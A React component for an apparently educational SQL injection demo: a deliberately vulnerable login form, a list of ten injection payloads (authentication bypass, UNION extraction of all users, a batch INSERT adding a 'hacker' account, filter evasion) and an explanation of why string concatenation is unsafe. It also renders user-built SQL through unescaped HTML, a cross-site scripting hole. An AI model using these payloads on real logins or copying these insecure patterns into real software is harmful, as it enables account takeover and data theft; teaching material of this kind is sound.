import { useState } from "react"; 
import axios from "axios";
import { toast } from "react-toastify";

const API_URL = "http://localhost:5000/api/auth";

const VulnerableLogin = () => {
  const [username, setUsername] = useState(""); // Stores the username input value
  const [password, setPassword] = useState(""); // Stores the password input value
  const [loading, setLoading] = useState(false); // Tracks if a request is in progress
  const [result, setResult] = useState(null); // Stores the result of the login attempt
  const [sqlQuery, setSqlQuery] = useState(""); // Stores the SQL query for display

  // Function that handles the login submission
  const handleVulnerableLogin = async (e) => {
    // Prevent the default form submission behavior (page refresh)
    e.preventDefault();

    setLoading(true);

    // Clear any previous results
    setResult(null);

    try {
      // Create a demonstration SQL query to show what happens on the server
      const demoQuery = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}' OR password = '${password}' AND username = '${username}'`;
      setSqlQuery(demoQuery);

      // Send the login request to the vulnerable endpoint
      const response = await axios.post(`${API_URL}/vulnerable/login`, {
        username,
        password,
      });

      // If we get here, the request was successful
      setResult({
        success: true,
        message: "Login successful! The SQL injection attack worked.",
        data: response.data,
      });

      // Show a success notification
      toast.success(
        "Login successful (VULNERABLE)! SQL injection attack worked."
      );

    } catch (error) {
      setResult({
        success: false,
        message: error.response?.data?.message || "Login failed",
        error: error.response?.data || error.message,
      });

      toast.error("Login failed");
      
    } finally {
      // Whether success or failure, we're no longer loading
      setLoading(false);
    }
  };

  // Example SQL injection attacks users can try
  const examples = [
    {
      title: "1. Basic OR Injection",
      value: "' OR '1'='1",
      description:
        "Bypasses authentication by making the WHERE clause always evaluate to true",
    },
    {
      title: "2. Comment-Based Injection",
      value: "admin'--",
      description:
        "Logs in as 'admin' by commenting out the password check portion of the query",
    },
    {
      title: "3. UNION Attack (All Users)",
      value: "' OR 1=1 UNION SELECT * FROM users WHERE '1'='1",
      description:
        "Returns ALL users from the database by using UNION to append a second query",
    },
    {
      title: "4. Multiple OR Conditions",
      value: "' OR 1=1 OR '1'='",
      description:
        "Uses redundant OR conditions to ensure the WHERE clause evaluates to true",
    },
    {
      title: "5. Numerical Comparison",
      value: "x' OR 1=1--",
      description:
        "Uses a numerical comparison (1=1) that's always true rather than string comparison",
    },
    {
      title: "6. Authentication Bypass with NULL",
      value: "admin' OR username IS NOT NULL--",
      description:
        "Checks for any non-NULL username, which will match all user records",
    },
    {
      title: "7. Batch Query Injection",
      value:
        "admin'; INSERT INTO users VALUES (99, 'hacker', 'pass', 'hack@er.com');--",
      description:
        "Attempts to execute multiple SQL statements by adding a semicolon and new command",
    },
    {
      title: "8. Case Manipulation",
      value: "aDmIn'/**/Or/**/1=1--",
      description:
        "Uses case variation and SQL comments to evade simple detection filters",
    },
    {
      title: "9. UNION with Custom Values",
      value: "' UNION SELECT 1, 'admin', 'password123', 'admin@example.com'--",
      description:
        "Creates a fake user record through a UNION attack with specified column values",
    },
    {
      title: "10. OR with Subquery",
      value: "' OR EXISTS(SELECT * FROM users)--",
      description:
        "Uses a subquery that will be true if the users table has any records at all",
    },
  ];

  // Function to apply an example to the username field
  const applyExample = (example) => {
    setUsername(example.value);
    setPassword("anything"); // The password doesn't matter for these attacks
  };

  // The JSX that renders our component
  return (
    // Main container with special styling for the vulnerable section
    <div className="vulnerable-section p-6 rounded-lg">
      {/* Section title */}
      <h2 className="text-2xl font-bold mb-4">Vulnerable Login Form</h2>

      {/* Warning alert to indicate this is insecure */}
      <div className="alert alert-warning mb-4">
        <svg
          xmlns="http://www.w3.org/2000/svg"
          className="stroke-current shrink-0 h-6 w-6"
          fill="none"
          viewBox="0 0 24 24"
        >
          <path
            strokeLinecap="round"
            strokeLinejoin="round"
            strokeWidth="2"
            d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"
          />
        </svg>
        <div>
          <h3 className="font-bold">
            This login form is vulnerable to SQL injection!
          </h3>
          <p className="text-sm">
            It demonstrates how NOT to implement authentication.
          </p>
        </div>
      </div>

      {/* Login form */}
      <form onSubmit={handleVulnerableLogin} className="space-y-4 mb-6">
        {/* Username input field */}
        <div className="form-control">
          <label className="label mr-4">
            <span className="label-text">Username</span>
          </label>
          <input
            type="text"
            className="input input-bordered"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            placeholder="Try SQL injection here..."
            required
          />
        </div>

        {/* Password input field */}
        <div className="form-control">
          <label className="label mr-4">
            <span className="label-text">Password</span>
          </label>
          <input
            type="password"
            className="input input-bordered"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="Password (can be anything for injection)"
          />
        </div>

        {/* Submit button - shows a spinner when loading */}
        <button
          type="submit"
          className="btn btn-primary w-full"
          disabled={loading}
        >
          {loading ? (
            <span className="loading loading-spinner"></span>
          ) : (
            "Login (Vulnerable)"
          )}
        </button>
      </form>

      {/* Divider line with text */}
      <div className="divider">SQL Injection Examples</div>

      {/* Grid of example SQL injections users can try */}
      <div className="h-64 overflow-y-auto pr-2">
        <div className="grid grid-cols-1 gap-4">
          {examples.map((example, index) => (
            <div key={index} className="card bg-base-200 shadow-sm">
              <div className="card-body p-4">
                <h3 className="card-title text-base">{example.title}</h3>
                <div className="code-block text-sm bg-base-300 p-2 rounded my-2 overflow-x-auto text-black">
                  {example.value}
                </div>
                <p className="text-xs">{example.description}</p>
                <button
                  className="btn btn-sm btn-outline mt-2"
                  onClick={() => applyExample(example)}
                >
                  Apply Example
                </button>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Display the generated SQL query if available */}
      {sqlQuery && (
        <div className="mb-6">
          <h3 className="text-lg font-semibold mb-2">Generated SQL Query:</h3>
          <pre className="code-block p-3 bg-base-300 rounded overflow-x-auto">
            <code
              className="text-gray-900"
              dangerouslySetInnerHTML={{
                __html: sqlQuery.replace(
                  /(SELECT|FROM|WHERE|AND|OR|UNION|'[^']*'|=)/g,
                  (match) => {
                    if (match.startsWith("'"))
                      return `<span class="sql-string">${match}</span>`;
                    if (match === "=")
                      return `<span class="sql-operator">${match}</span>`;
                    return `<span class="sql-keyword">${match}</span>`;
                  }
                ),
              }}
            />
          </pre>
        </div>
      )}

      {/* Display the result of the login attempt if available */}
      {result && (
        <div
          className={`alert ${
            result.success ? "alert-success" : "alert-error"
          } mt-4`}
        >
          <div>
            <h3 className="font-bold">
              {result.success ? "Success!" : "Failed!"}
            </h3>
            <div className="text-sm">{result.message}</div>

            {/* If login succeeded, show the user data that was retrieved */}
            {result.success && result.data && (
              <div className="mt-2 p-2 bg-base-100 rounded">
                <div className="text-xs font-semibold">Authenticated as:</div>
                <pre className="text-xs overflow-x-auto">
                  {JSON.stringify(result.data.user, null, 2)}
                </pre>

                {/* Display all users if they were returned */}
                {result.data.allUsers && result.data.allUsers.length > 1 && (
                  <div className="mt-4">
                    <div className="text-xs font-semibold text-red-500">
                      SQL Injection attack successfully retrieved{" "}
                      {result.data.allUsers.length} users from database:
                    </div>
                    <div className="max-h-60 overflow-y-auto mt-2">
                      <table className="table table-compact w-full">
                        <thead>
                          <tr>
                            <th className="text-xs">ID</th>
                            <th className="text-xs">Username</th>
                            <th className="text-xs">Email</th>
                            <th className="text-xs">Password Hash</th>
                          </tr>
                        </thead>
                        <tbody>
                          {result.data.allUsers.map((user) => (
                            <tr key={user.id} className="hover">
                              <td className="text-xs">{user.id}</td>
                              <td className="text-xs">{user.username}</td>
                              <td className="text-xs">{user.email}</td>
                              <td className="text-xs font-mono text-[0.6rem] truncate max-w-xs">
                                {user.password?.substring(0, 20)}...
                              </td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  </div>
                )}
              </div>
            )}

            {/* If login failed, show the error details */}
            {!result.success && result.error && (
              <div className="mt-2 p-2 bg-base-100 rounded">
                <pre className="text-xs overflow-x-auto">
                  {JSON.stringify(result.error, null, 2)}
                </pre>
              </div>
            )}
          </div>
        </div>
      )}

      {/* Educational section explaining the vulnerability */}
      <div className="mt-8">
        <h3 className="text-lg font-semibold mb-2">Why This Is Vulnerable</h3>
        <p className="mb-2">
          This login form is vulnerable because it builds SQL queries by
          directly concatenating user input. This allows an attacker to
          manipulate the query structure by injecting SQL code.
        </p>
        <p className="mb-4">Common SQL injection patterns include:</p>
        <ul className="list-disc list-inside space-y-2 mb-4">
          <li>
            <code className="bg-base-300 px-1">
              &#39; OR &#39;1&#39;=&#39;1
            </code>{" "}
            - Makes the WHERE clause always true
          </li>
          <li>
            <code className="bg-base-300 px-1">admin&#39;--</code> - Comments
            out the password check part of the query
          </li>
          <li>
            <code className="bg-base-300 px-1">&#39; UNION SELECT ...</code> -
            Joins results with a second SELECT statement
          </li>
        </ul>
      </div>
    </div>
  );
};

// Export the component so it can be imported elsewhere
export default VulnerableLogin;
